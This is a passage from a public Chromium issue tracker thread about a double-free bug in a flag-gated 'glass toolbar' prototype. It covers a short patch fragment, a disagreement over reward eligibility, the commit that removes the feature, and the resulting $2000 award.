   if (!installed) {
-    delete pinner;
     return;
   }

```

### ar...@google.com (2026-04-20)

Hi Alisa,

Thank you for the detailed report, root cause analysis, and the provided test case. You have clearly identified a valid double-free issue in `BrowserLiveBackgroundController::VideoConsumer::OnFrameCaptured()` caused by the overlapping cleanup paths between Skia's `installPixels` release callback and the explicit `delete` upon failure.

However, because this vulnerability relies on the `GlassToolbar` feature, which is disabled by default and must be manually activated by the user via `chrome://flags#glass-toolbar`, it does not qualify as a security bug. Per our [Severity Guidelines for features not enabled by default](https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md#Features-not-enabled-by-default), issues that require a non-default flag or command-line switch to be enabled are not considered security bugs and are not eligible for Chrome VRP rewards.

I am reclassifying this report as Impact-None, high severity, because this is not affecting users.

We appreciate the high-quality technical write-up and the effort you put into tracking this down!

---

AFAU, this is a prototype behind a flag. It was meant to be removed by 13th March 2026:
<https://chromium-review.git.corp.google.com/c/chromium/src/+/7615109>

This sounds like a straightforward bug that would have appeared immediately on crash/ if shipped to users.
I guess the next step is closing the bug when removing reverting: <https://chromium-review.googlesource.com/c/chromium/src/+/7615109>

### ch...@google.com (2026-04-21)

The Found In field may only contain numeric values.
Some values couldn't be corrected but were removed, please verify that any important data wasn't lost.
You can see the changes by toggling full history on the issue.

### al...@gmail.com (2026-04-21)

Current VRP rules explicitly state that bugs behind experimental flags are eligible, with the exception of v8 experimental flags specifically:

"Bugs in unlaunched features – **in code behind a feature flag not enabled by default – are generally eligible for the full potential VRP reward**, with the exception of bugs in V8 features marked as Experimental. These features are part of early and experimental V8 development efforts and introduce a known stability and security risk. Security bugs that are specific to V8 Experimental features are not eligible for Chrome VRP rewards."

<https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules>

The bug is in browser process - not v8, therefore it is explicitly eligible for VRP.

Meanwhile, the article that you link doesn't mention VRP at all. It's a guide for security severity evaluation, which is a distinct metric from VRP eligibility. The official VRP rules have a decisive precedence on the latter.

Could you check again?

### em...@google.com (2026-04-23)

The glass toolbar feature is no longer planned for launch, I plan to remove this code shortly which should address this bug.

### dx...@google.com (2026-04-23)

Project: chromium/src  

Branch:  main  

Author:  Emily Shack [emshack@chromium.org](mailto:emshack@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7789723>

[GlowUp] Remove glass toolbar code

---


Expand for full commit details
```
     
    This feature is no longer planned for implementation, remove the 
    prototype 
     
    Bug: 498733758, 503987504 
    Change-Id: I3a2c087f6e4548271c1b0ec38e8f4bd0d357a76d 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7789723 
    Commit-Queue: Emily Shack <emshack@chromium.org> 
    Reviewed-by: Darryl James <dljames@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1619798}

```

---

Files:

- M `chrome/browser/about_flags.cc`
- M `chrome/browser/flag-metadata.json`
- M `chrome/browser/flag_descriptions.h`
- M `chrome/browser/ui/color/material_chrome_color_mixer.cc`
- M `chrome/browser/ui/ui_features.cc`
- M `chrome/browser/ui/ui_features.h`
- M `chrome/browser/ui/views/bookmarks/bookmark_bar_view.cc`
- M `chrome/browser/ui/views/frame/layout/browser_view_tabbed_layout_impl.cc`
- M `chrome/browser/ui/views/toolbar/BUILD.gn`
- D `chrome/browser/ui/views/toolbar/live_toolbar_background.cc`
- D `chrome/browser/ui/views/toolbar/live_toolbar_background.h`
- M `chrome/browser/ui/views/toolbar/toolbar_view.cc`

---

Hash: [0679b562b6606c9a0cfd3e03c3a15d2ab8712880](https://chromiumdash.appspot.com/commit/0679b562b6606c9a0cfd3e03c3a15d2ab8712880)  

Date: Thu Apr 23 22:34:48 2026


---

### al...@gmail.com (2026-05-03)

As the VRP rules just changed, I'd like to link the version of Chromium VRP rules that was active on the date when the bug was submitted: <https://web.archive.org/web/20260419093225/https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules>

### sp...@google.com (2026-05-04)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
highly mitigated browser memory corruption


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-31)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/503987504)*
